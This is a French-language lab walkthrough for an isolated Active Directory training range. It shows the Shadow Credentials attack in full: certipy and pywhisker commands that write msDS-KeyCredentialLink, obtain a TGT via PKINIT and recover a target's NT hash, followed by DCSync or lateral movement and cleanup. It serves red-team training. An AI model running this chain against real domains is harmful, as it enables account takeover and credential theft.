# Build — Shadow Credentials (lab isolé GOAD-X)

## Pré-requis
- Un principal avec **WriteProperty/GenericWrite/GenericAll** sur `msDS-KeyCredentialLink` d'une cible
  (via recon/ACL, modules 51/21). Key Trust/PKINIT supporté (PKI dans le lab).

## Étape 1 — Repérer l'edge AddKeyCredentialLink (BloodHound)
Dans BloodHound, chercher les cibles où ton principal a **AddKeyCredentialLink**.

## Étape 2 — Chaîne automatique (certipy)
```bash
certipy shadow auto -u attacker@corp.meridian.com -p 'pass' -account 'victim$' -dc-ip 10.10.0.10
# -> ajoute une KeyCredential, obtient un TGT via PKINIT, récupère le NT hash, nettoie l'attribut
```

## Étape 3 — Chaîne manuelle (pywhisker + Rubeus/gettgtpkinit)
```bash
# Ajouter la KeyCredential
pywhisker -d corp.meridian.com -u attacker -p 'pass' --target 'victim$' --action add
# Utiliser le PFX généré pour obtenir un TGT (PKINIT)
# (Rubeus asktgt /certificate:... /user:victim$  OU gettgtpkinit)
```

## Étape 4 — Exploiter
Avec le TGT/NT hash de la cible : accès à ce qu'elle protège (si c'est un DC → DCSync ; si admin →
mouvement latéral).

## Étape 5 — Nettoyer
```bash
certipy shadow clear -u attacker@corp.meridian.com -p 'pass' -account 'victim$' -dc-ip 10.10.0.10
# ou pywhisker --action remove
```

## Vérification
- TGT/NT hash de la cible obtenu ; attribut nettoyé après l'exercice.

## Pièges courants
- Pas de Key Trust/PKINIT configuré → la chaîne échoue (prérequis PKI).
- Oublier de nettoyer `msDS-KeyCredentialLink` (persistance résiduelle).
